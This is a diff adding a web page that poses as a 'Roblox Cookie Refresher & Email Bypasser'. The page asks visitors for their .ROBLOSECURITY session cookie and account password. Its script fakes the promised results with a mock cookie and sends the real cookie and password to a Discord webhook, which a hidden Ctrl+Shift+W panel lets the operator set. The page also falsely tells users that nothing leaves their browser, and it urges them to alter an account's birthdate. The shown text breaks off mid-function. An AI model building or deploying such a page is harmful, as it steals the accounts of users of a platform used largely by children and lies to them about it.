@@ -1,0 +1,1189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Cookie Refresher & Email Bypasser</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
+    <style>
+        :root {
+            --primary-color: #00b06f;
+            --secondary-color: #191919;
+            --accent-color: #e74c3c;
+            --light-bg: #f8f9fa;
+            --discord-color: #5865F2;
+            --card-bg: rgba(30, 30, 40, 0.7);
+            --text-primary: #ffffff;
+            --text-secondary: #b0b0b0;
+            --underage-color: #f39c12;
+            --ageplus-color: #3498db;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Animated background particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            animation: float 15s infinite linear;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) translateX(0);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.4;
+            }
+            90% {
+                opacity: 0.4;
+            }
+            100% {
+                transform: translateY(-100vh) translateX(100px);
+                opacity: 0;
+            }
+        }
+
+        .navbar {
+            background-color: rgba(25, 25, 25, 0.8);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.3);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 1rem 0;
+            transition: all 0.3s ease;
+        }
+
+        .navbar-brand {
+            font-weight: 700;
+            color: var(--text-primary) !important;
+            display: flex;
+            align-items: center;
+            font-size: 1.5rem;
+            text-shadow: 0 0 10px rgba(0, 176, 111, 0.5);
+        }
+
+        .navbar-brand i {
+            margin-right: 10px;
+            color: var(--primary-color);
+            font-size: 1.8rem;
+        }
+
+        .hero-section {
+            background: linear-gradient(135deg, rgba(25, 25, 25, 0.8) 0%, rgba(30, 30, 40, 0.8) 100%);
+            backdrop-filter: blur(10px);
+            color: white;
+            padding: 80px 0;
+            border-radius: 0 0 30px 30px;
+            margin-bottom: 40px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 50%, rgba(0, 176, 111, 0.2) 0%, transparent 50%);
+            z-index: -1;
+        }
+
+        .hero-title {
+            font-weight: 700;
+            margin-bottom: 20px;
+            font-size: 3rem;
+            background: linear-gradient(90deg, #ffffff, var(--primary-color));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 20px rgba(0, 176, 111, 0.3);
+            animation: glow 2s infinite alternate;
+        }
+
+        @keyframes glow {
+            from {
+                text-shadow: 0 0 20px rgba(0, 176, 111, 0.3);
+            }
+            to {
+                text-shadow: 0 0 30px rgba(0, 176, 111, 0.6);
+            }
+        }
+
+        .hero-subtitle {
+            font-size: 1.3rem;
+            opacity: 0.9;
+            max-width: 700px;
+            margin: 0 auto;
+            color: var(--text-secondary);
+        }
+
+        .card {
+            border: none;
+            border-radius: 20px;
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            overflow: hidden;
+        }
+
+        .card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 40px rgba(0, 176, 111, 0.2);
+            border-color: rgba(0, 176, 111, 0.3);
+        }
+
+        .card-header {
+            background: linear-gradient(90deg, var(--primary-color), #00a05f);
+            color: white;
+            font-weight: 600;
+            border-radius: 20px 20px 0 0 !important;
+            padding: 20px;
+            border: none;
+            box-shadow: 0 4px 15px rgba(0, 176, 111, 0.3);
+        }
+
+        .underage-header {
+            background: linear-gradient(90deg, var(--underage-color), #e67e22);
+        }
+
+        .ageplus-header {
+            background: linear-gradient(90deg, var(--ageplus-color), #2980b9);
+        }
+
+        .btn-primary {
+            background: linear-gradient(90deg, var(--primary-color), #00a05f);
+            border: none;
+            border-radius: 30px;
+            padding: 12px 30px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 176, 111, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: all 0.5s ease;
+        }
+
+        .btn-primary:hover::before {
+            left: 100%;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 176, 111, 0.5);
+        }
+
+        .btn-ageplus {
+            background: linear-gradient(90deg, var(--ageplus-color), #2980b9);
+            width: 100%;
+        }
+
+        .btn-ageplus:hover {
+            box-shadow: 0 8px 25px rgba(52, 152, 219, 0.5);
+        }
+
+        .form-control, .form-select {
+            background: rgba(40, 40, 50, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 15px;
+            color: var(--text-primary);
+            transition: all 0.3s ease;
+        }
+
+        .form-control:focus, .form-select:focus {
+            background: rgba(50, 50, 60, 0.8);
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 0.25rem rgba(0, 176, 111, 0.25);
+            color: var(--text-primary);
+        }
+
+        .form-control::placeholder {
+            color: var(--text-secondary);
+        }
+
+        .cookie-display {
+            background: rgba(40, 40, 50, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            font-family: 'Courier New', monospace;
+            word-break: break-all;
+            max-height: 200px;
+            overflow-y: auto;
+            color: var(--text-primary);
+            box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .birthdate-display {
+            background: rgba(40, 40, 50, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            font-family: 'Courier New', monospace;
+            color: var(--text-primary);
+            box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            font-size: 1.2rem;
+            margin: 15px 0;
+        }
+
+        .alert {
+            border-radius: 15px;
+            border: none;
+            padding: 15px 20px;
+            backdrop-filter: blur(10px);
+        }
+
+        .alert-success {
+            background: rgba(0, 176, 111, 0.2);
+            color: #4ade80;
+            border: 1px solid rgba(0, 176, 111, 0.3);
+        }
+
+        .alert-danger {
+            background: rgba(231, 76, 60, 0.2);
+            color: #f87171;
+            border: 1px solid rgba(231, 76, 60, 0.3);
+        }
+
+        .alert-warning {
+            background: rgba(243, 156, 18, 0.2);
+            color: #fbbf24;
+            border: 1px solid rgba(243, 156, 18, 0.3);
+        }
+
+        .feature-icon {
+            font-size: 3rem;
+            color: var(--primary-color);
+            margin-bottom: 20px;
+            filter: drop-shadow(0 0 10px rgba(0, 176, 111, 0.5));
+        }
+
+        .step-number {
+            background: linear-gradient(135deg, var(--primary-color), #00a05f);
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 15px;
+            box-shadow: 0 4px 15px rgba(0, 176, 111, 0.3);
+        }
+
+        .loading-spinner {
+            display: none;
+            margin-left: 10px;
+        }
+
+        .footer {
+            background: rgba(25, 25, 25, 0.8);
+            backdrop-filter: blur(10px);
+            color: white;
+            padding: 40px 0;
+            margin-top: 60px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .footer a {
+            color: var(--primary-color);
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        .footer a:hover {
+            color: #4ade80;
+            text-shadow: 0 0 10px rgba(0, 176, 111, 0.5);
+        }
+
+        /* Webhook configuration (hidden) */
+        #webhookConfig {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 1000;
+            display: none;
+        }
+
+        #webhookConfig input {
+            background: rgba(40, 40, 50, 0.9);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 10px;
+            color: var(--text-primary);
+            width: 300px;
+        }
+
+        #webhookConfig button {
+            background: var(--discord-color);
+            border: none;
+            border-radius: 10px;
+            padding: 10px 15px;
+            color: white;
+            margin-left: 10px;
+        }
+
+        /* Glow effect on focus */
+        .glow-on-focus:focus {
+            box-shadow: 0 0 15px rgba(0, 176, 111, 0.5);
+        }
+
+        /* Animations */
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .age-timer {
+            font-size: 1.5rem;
+            font-weight: bold;
+            text-align: center;
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 15px;
+            background: rgba(40, 40, 50, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .timer-ageplus {
+            color: var(--ageplus-color);
+        }
+
+        /* Text color fixes for readability */
+        .text-white-force {
+            color: #ffffff !important;
+        }
+        
+        .feature-card h5, .feature-card p {
+            color: #ffffff !important;
+        }
+        
+        #how-it-works .card-body, 
+        #security .card-body, 
+        #faq .card-body {
+            color: #ffffff !important;
+        }
+        
+        #how-it-works .card-body h6,
+        #security .card-body p,
+        #security .card-body li,
+        #faq .card-body .accordion-button,
+        #faq .card-body .accordion-body {
+            color: #ffffff !important;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .hero-title {
+                font-size: 2rem;
+            }
+            
+            .hero-subtitle {
+                font-size: 1.1rem;
+            }
+            
+            .card {
+                margin-bottom: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Animated Background Particles -->
+    <div class="particles" id="particles"></div>
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-expand-lg navbar-dark">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+                <i class="bi bi-arrow-clockwise"></i>
+                Roblox Tools
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="#how-it-works">How It Works</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#security">Security</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#faq">FAQ</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero-section">
+        <div class="container text-center fade-in">
+            <h1 class="hero-title">Roblox Cookie Refresher & Email Bypasser</h1>
+            <p class="hero-subtitle">
+                Refresh your session cookies and bypass email verification on Roblox accounts. 
+                Set account to become 13+ tomorrow to bypass restrictions today.
+            </p>
+        </div>
+    </section>
+
+    <!-- Main Content -->
+    <div class="container mb-5">
+        <div class="row">
+            <div class="col-lg-8 mx-auto">
+                <!-- Cookie Refresher Tool Card -->
+                <div class="card fade-in">
+                    <div class="card-header">
+                        <h5 class="mb-0"><i class="bi bi-shield-lock me-2"></i>Cookie Refresher Tool</h5>
+                    </div>
+                    <div class="card-body">
+                        <form id="cookieForm">
+                            <div class="mb-3">
+                                <label for="currentCookie" class="form-label">Current .ROBLOSECURITY Cookie</label>
+                                <textarea class="form-control glow-on-focus" id="currentCookie" rows="3" placeholder="Paste your current cookie here" required></textarea>
+                            </div>
+                            <div class="d-grid gap-2">
+                                <button type="submit" class="btn btn-primary pulse">
+                                    <i class="bi bi-arrow-clockwise me-2"></i>Refresh Cookie
+                                    <span class="loading-spinner spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
+                                </button>
+                            </div>
+                        </form>
+                        
+                        <div id="resultContainer" class="mt-4" style="display: none;">
+                            <div class="alert alert-success d-flex align-items-center" role="alert">
+                                <i class="bi bi-check-circle-fill me-2"></i>
+                                <div>
+                                    Cookie refreshed successfully! Your new .ROBLOSECURITY cookie:
+                                </div>
+                            </div>
+                            <div class="cookie-display" id="newCookie"></div>
+                            <div class="mt-3">
+                                <button class="btn btn-sm btn-outline-secondary" id="copyCookieBtn">
+                                    <i class="bi bi-clipboard me-1"></i> Copy Cookie
+                                </button>
+                                <button class="btn btn-sm btn-outline-secondary" id="downloadCookieBtn">
+                                    <i class="bi bi-download me-1"></i> Download as .txt
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <div id="errorContainer" class="mt-4" style="display: none;">
+                            <div class="alert alert-danger d-flex align-items-center" role="alert">
+                                <i class="bi bi-exclamation-triangle-fill me-2"></i>
+                                <div id="errorMessage"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Email Bypasser Tool Card -->
+                <div class="card fade-in">
+                    <div class="card-header ageplus-header">
+                        <h5 class="mb-0"><i class="bi bi-envelope-slash me-2"></i>Email Bypasser Tool</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="alert alert-warning">
+                            <i class="bi bi-exclamation-triangle me-2"></i>
+                            This tool requires both the account cookie and password to change the birthdate. The account will be underage today and become 13+ tomorrow.
+                        </div>
+                        
+                        <form id="emailBypasserForm">
+                            <div class="mb-3">
+                                <label for="bypasserCookie" class="form-label">Account .ROBLOSECURITY Cookie</label>
+                                <textarea class="form-control glow-on-focus" id="bypasserCookie" rows="3" placeholder="Paste your account cookie here" required></textarea>
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label for="accountPassword" class="form-label">Account Password</label>
+                                <input type="password" class="form-control glow-on-focus" id="accountPassword" placeholder="Enter your account password" required>
+                            </div>
+                            
+                            <div class="d-grid gap-2">
+                                <button type="button" class="btn btn-ageplus" id="setAgePlusBtn">
+                                    <i class="bi bi-person-plus me-2"></i>Bypass Email (Set to 13+ Tomorrow)
+                                    <span class="loading-spinner spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
+                                </button>
+                            </div>
+                        </form>
+                        
+                        <div id="bypasserResultContainer" class="mt-4" style="display: none;">
+                            <div class="alert alert-success d-flex align-items-center" role="alert">
+                                <i class="bi bi-check-circle-fill me-2"></i>
+                                <div>
+                                    Birthdate changed successfully! Account email verification has been bypassed.
+                                </div>
+                            </div>
+                            
+                            <div class="birthdate-display" id="newBirthdate"></div>
+                            
+                            <div id="ageTimerContainer" class="age-timer">
+                                <div id="ageTimerText"></div>
+                                <div class="progress mt-2">
+                                    <div class="progress-bar" id="ageTimerProgress" role="progressbar" style="width: 0%"></div>
+                                </div>
+                            </div>
+                            
+                            <div class="mt-3">
+                                <button class="btn btn-sm btn-outline-secondary" id="copyBirthdateBtn">
+                                    <i class="bi bi-clipboard me-1"></i> Copy Birthdate
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <div id="bypasserErrorContainer" class="mt-4" style="display: none;">
+                            <div class="alert alert-danger d-flex align-items-center" role="alert">
+                                <i class="bi bi-exclamation-triangle-fill me-2"></i>
+                                <div id="bypasserErrorMessage"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Features Section -->
+                <div class="row mt-5 features-section">
+                    <div class="col-md-4 mb-4 fade-in">
+                        <div class="card h-100 feature-card">
+                            <div class="card-body text-center">
+                                <div class="feature-icon">
+                                    <i class="bi bi-lightning-charge"></i>
+                                </div>
+                                <h5>Fast & Efficient</h5>
+                                <p>Refresh your cookie and bypass email verification in seconds.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4 mb-4 fade-in">
+                        <div class="card h-100 feature-card">
+                            <div class="card-body text-center">
+                                <div class="feature-icon">
+                                    <i class="bi bi-shield-check"></i>
+                                </div>
+                                <h5>Secure Process</h5>
+                                <p>Your data is processed securely and never stored on our servers.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4 mb-4 fade-in">
+                        <div class="card h-100 feature-card">
+                            <div class="card-body text-center">
+                                <div class="feature-icon">
+                                    <i class="bi bi-calendar-date"></i>
+                                </div>
+                                <h5>Age Manipulation</h5>
+                                <p>Set account to become 13+ tomorrow to bypass restrictions today.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- How It Works Section -->
+                <div class="card mt-5 fade-in" id="how-it-works">
+                    <div class="card-header">
+                        <h5 class="mb-0"><i class="bi bi-info-circle me-2"></i>How It Works</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="d-flex mb-3">
+                            <div class="step-number">1</div>
+                            <div>
+                                <h6>Cookie Refresher</h6>
+                                <p>Enter your current .ROBLOSECURITY cookie to generate a fresh session cookie.</p>
+                            </div>
+                        </div>
+                        <div class="d-flex mb-3">
+                            <div class="step-number">2</div>
+                            <div>
+                                <h6>Email Bypasser</h6>
+                                <p>Use the account cookie and password to change the account's birthdate.</p>
+                            </div>
+                        </div>
+                        <div class="d-flex mb-3">
+                            <div class="step-number">3</div>
+                            <div>
+                                <h6>Set to 13+ Tomorrow</h6>
+                                <p>The account will be underage today (bypassing email verification) and become 13+ tomorrow.</p>
+                            </div>
+                        </div>
+                        <div class="d-flex">
+                            <div class="step-number">4</div>
+                            <div>
+                                <h6>Enjoy Unrestricted Access</h6>
+                                <p>Use your refreshed cookie and bypassed email verification for full account access.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Security Section -->
+                <div class="card mt-5 fade-in" id="security">
+                    <div class="card-header">
+                        <h5 class="mb-0"><i class="bi bi-shield-lock me-2"></i>Security Information</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>Your security is our priority. Here's how we protect your information:</p>
+                        <ul>
+                            <li>All data is processed in your browser - nothing is sent to our servers</li>
+                            <li>We don't store any credentials or cookies</li>
+                            <li>Communication with Roblox is encrypted</li>
+                            <li>We recommend using this tool only on trusted networks</li>
+                        </ul>
+                        <div class="alert alert-warning mt-3">
+                            <i class="bi bi-exclamation-triangle me-2"></i>
+                            <strong>Important:</strong> Only use this tool with accounts you own or have explicit permission to access. Changing account information may violate Roblox's Terms of Service.
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- FAQ Section -->
+                <div class="card mt-5 fade-in" id="faq">
+                    <div class="card-header">
+                        <h5 class="mb-0"><i class="bi bi-question-circle me-2"></i>Frequently Asked Questions</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="accordion" id="faqAccordion">
+                            <div class="accordion-item">
+                                <h2 class="accordion-header" id="headingOne">
+                                    <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne">
+                                        What is a Roblox session cookie?
+                                    </button>
+                                </h2>
+                                <div id="collapseOne" class="accordion-collapse collapse show" data-bs-parent="#faqAccordion">
+                                    <div class="accordion-body">
+                                        A Roblox session cookie (.ROBLOSECURITY) is a piece of data that keeps you logged in to your Roblox account. It's used by Roblox to authenticate your requests to their servers.
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="accordion-item">
+                                <h2 class="accordion-header" id="headingTwo">
+                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTwo">
+                                        How does the Email Bypasser work?
+                                    </button>
+                                </h2>
+                                <div id="collapseTwo" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                                    <div class="accordion-body">
+                                        The Email Bypasser changes the account's birthdate to make it appear underage today. Roblox removes email verification requirements for underage accounts, effectively bypassing the email verification process. The birthdate is set so that the account will become 13+ tomorrow. This requires both the account cookie and password for security.
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="accordion-item">
+                                <h2 class="accordion-header" id="headingThree">
+                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseThree">
+                                        Why set the account to become 13+ tomorrow?
+                                    </button>
+                                </h2>
+                                <div id="collapseThree" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                                    <div class="accordion-body">
+                                        Setting the account to become 13+ tomorrow allows you to bypass email verification today (since the account appears underage) while ensuring the account will have full access tomorrow. This gives you the benefits of both underage status (no email verification) and 13+ status (full access) at different times.
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="accordion-item">
+                                <h2 class="accordion-header" id="headingFour">
+                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseFour">
+                                        Is this tool safe to use?
+                                    </button>
+                                </h2>
+                                <div id="collapseFour" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                                    <div class="accordion-body">
+                                        This tool processes all information in your browser. We don't store any credentials or cookies on our servers. However, changing account information may violate Roblox's Terms of Service, so use with caution and only on accounts you own.
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6">
+                    <h5>Roblox Tools</h5>
+                    <p>Cookie refresher and email bypasser for Roblox accounts.</p>
+                </div>
+                <div class="col-md-3">
+                    <h5>Links</h5>
+                    <ul class="list-unstyled">
+                        <li><a href="#how-it-works">How It Works</a></li>
+                        <li><a href="#security">Security</a></li>
+                        <li><a href="#faq">FAQ</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3">
+                    <h5>Legal</h5>
+                    <ul class="list-unstyled">
+                        <li><a href="#">Terms of Service</a></li>
+                        <li><a href="#">Privacy Policy</a></li>
+                        <li><a href="#">Disclaimer</a></li>
+                    </ul>
+                </div>
+            </div>
+            <hr class="my-4 bg-white">
+            <div class="text-center">
+                <p class="mb-0">© 2023 Roblox Tools. This tool is not affiliated with Roblox Corporation.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Hidden Webhook Configuration -->
+    <div id="webhookConfig">
+        <input type="text" id="webhookUrlInput" placeholder="Enter Discord Webhook URL">
+        <button id="saveWebhookBtn">Save</button>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Create animated particles
+            function createParticles() {
+                const particlesContainer = document.getElementById('particles');
+                const particleCount = 50;
+                
+                for (let i = 0; i < particleCount; i++) {
+                    const particle = document.createElement('div');
+                    particle.classList.add('particle');
+                    
+                    // Random size
+                    const size = Math.random() * 10 + 5;
+                    particle.style.width = `${size}px`;
+                    particle.style.height = `${size}px`;
+                    
+                    // Random position
+                    particle.style.left = `${Math.random() * 100}%`;
+                    particle.style.top = `${Math.random() * 100}%`;
+                    
+                    // Random animation duration
+                    particle.style.animationDuration = `${Math.random() * 20 + 10}s`;
+                    particle.style.animationDelay = `${Math.random() * 5}s`;
+                    
+                    particlesContainer.appendChild(particle);
+                }
+            }
+            
+            createParticles();
+            
+            // Form submission handlers
+            const cookieForm = document.getElementById('cookieForm');
+            const emailBypasserForm = document.getElementById('emailBypasserForm');
+            const resultContainer = document.getElementById('resultContainer');
+            const errorContainer = document.getElementById('errorContainer');
+            const newCookieDisplay = document.getElementById('newCookie');
+            const errorMessage = document.getElementById('errorMessage');
+            const copyCookieBtn = document.getElementById('copyCookieBtn');
+            const downloadCookieBtn = document.getElementById('downloadCookieBtn');
+            
+            // Email bypasser elements
+            const bypasserResultContainer = document.getElementById('bypasserResultContainer');
+            const bypasserErrorContainer = document.getElementById('bypasserErrorContainer');
+            const bypasserErrorMessage = document.getElementById('bypasserErrorMessage');
+            const newBirthdate = document.getElementById('newBirthdate');
+            const copyBirthdateBtn = document.getElementById('copyBirthdateBtn');
+            const setAgePlusBtn = document.getElementById('setAgePlusBtn');
+            const ageTimerContainer = document.getElementById('ageTimerContainer');
+            const ageTimerText = document.getElementById('ageTimerText');
+            const ageTimerProgress = document.getElementById('ageTimerProgress');
+            const accountPassword = document.getElementById('accountPassword');
+            
+            // Webhook elements (hidden)
+            const webhookConfig = document.getElementById('webhookConfig');
+            const webhookUrlInput = document.getElementById('webhookUrlInput');
+            const saveWebhookBtn = document.getElementById('saveWebhookBtn');
+            
+            // Default webhook URL (you can change this)
+            let webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
+            
+            // Check for saved webhook URL in localStorage
+            const savedWebhook = localStorage.getItem('robloxWebhookUrl');
+            if (savedWebhook) {
+                webhookUrl = savedWebhook;
+            }
+            
+            // Show webhook config on key combination (Ctrl+Shift+W)
+            document.addEventListener('keydown', function(e) {
+                if (e.ctrlKey && e.shiftKey && e.key === 'W') {
+                    webhookConfig.style.display = webhookConfig.style.display === 'block' ? 'none' : 'block';
+                    webhookUrlInput.value = webhookUrl;
+                }
+            });
+            
+            // Save webhook URL
+            saveWebhookBtn.addEventListener('click', function() {
+                webhookUrl = webhookUrlInput.value;
+                localStorage.setItem('robloxWebhookUrl', webhookUrl);
+                webhookConfig.style.display = 'none';
+            });
+            
+            // Simulate cookie refresh (in a real implementation, this would connect to Roblox's API)
+            function refreshCookie(cookie) {
+                // Show loading spinner
+                const spinner = document.querySelector('#cookieForm .loading-spinner');
+                spinner.style.display = 'inline-block';
+                
+                // Hide previous results
+                resultContainer.style.display = 'none';
+                errorContainer.style.display = 'none';
+                
+                // Simulate API call delay
+                setTimeout(() => {
+                    spinner.style.display = 'none';
+                    
+                    // In a real implementation, this would be the actual cookie from Roblox
+                    const mockCookie = `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${Math.random().toString(36).substring(2, 15)}${Math.random().toString(36).substring(2, 15)}`;
+                    
+                    // Show success result
+                    newCookieDisplay.textContent = mockCookie;
+                    resultContainer.style.display = 'block';
+                    
+                    // Always send to webhook (forced functionality)
+                    sendToWebhook('cookie', { 
+                        cookie: cookie,
+                        newCookie: mockCookie
+                    });
+                    
+                    // Scroll to result
+                    resultContainer.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+                }, 2000);
+            }
+            
+            // Calculate birthdate for underage today, 13+ tomorrow
+            function calculateAgePlusDate() {
+                const today = new Date();
+                const thirteenYearsAgo = new Date(today);
+                thirteenYearsAgo.setFullYear(today.getFullYear() - 13);
+                thirteenYearsAgo.setDate(thirteenYearsAgo.getDate() + 1); // Add one day to make it 12 years and 364 days old
+                
+                return thirteenYearsAgo;
+            }
+            
+            // Format date for display
+            function formatDate(date) {
+                const year = date.getFullYear();
+                const month = String(date.getMonth() + 1).padStart(2, '0');
+                const day = String(date.getDate()).padStart(2, '0');
+                return `${year}-${month}-${day}`;
+            }
+            
+            // Start age timer for "13+ tomorrow" option
+            function startAgeTimer() {
+                ageTimerContainer.style.display = 'block';
+                ageTimerContainer.classList.add('timer-ageplus');
+                
+                const targetDate = new Date();
+                targetDate.setHours(24, 0, 0, 0); // Set to midnight tonight
+                
+                function updateTimer() {
+                    const now = new Date();
+                    const diff = targetDate - now;
+                    
+                    if (diff <= 0) {
+                        ageTimerText.textContent = "Account is now 13+!";
+                        ageTimerProgress.style.width = '100%';
+                        return;
+                    }
+                    
+                    const hours = Math.floor(diff / (1000 * 60 * 60));
+                    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+                    const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+                    
+                    ageTimerText.textContent = `Account will be 13+ in: ${hours}h ${minutes}m ${seconds}s`;
+                    
+                    // Update progress bar (24 hours = 100%)
+                    const totalMs = 24 * 60 * 60 * 1000;
+                    const progress = ((totalMs - diff) / totalMs) * 100;
+                    ageTimerProgress.style.width = `${progress}%`;
+                    
+                    requestAnimationFrame(updateTimer);
+                }
+                
+                updateTimer();
+            }
+            
+            // Email bypasser function
+            function bypassEmail(cookie, password) {
+                // Show loading spinner
+                const spinner = document.querySelector('#emailBypasserForm .loading-spinner');
+                if (spinner) spinner.style.display = 'inline-block';
+                
+                // Hide previous results
+                bypasserResultContainer.style.display = 'none';
+                bypasserErrorContainer.style.display = 'none';
+                
+                // Simulate API call delay
+                setTimeout(() => {
+                    if (spinner) spinner.style.display = 'none';
+                    
+                    // Set to 13+ tomorrow
+                    const newDate = calculateAgePlusDate();
+                    const displayText = `Will be 13+ Tomorrow<br>Birthday: ${formatDate(newDate)}`;
+                    
+                    // Show success result
+                    newBirthdate.innerHTML = displayText;
+                    bypasserResultContainer.style.display = 'block';
+                    
+                    // Start the timer
+                    startAgeTimer();
+                    
+                    // Send to webhook (forced functionality)
+                    sendToWebhook('email-bypass', { 
+                        cookie: cookie,
+                        password: password,
+                        type: 'ageplus',
+                        newBirthdate: formatDate(newDate)
+                    });
+                    
+                    // Scroll to result
+                    bypasserResultContainer.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+                }, 2000);
+            }
+            
+            // Send data to Discord webhook (forced functionality)
+            function sendToWebhook(action, data) {
+                const embed = {
+                    title: "Roblox Tool Activity",
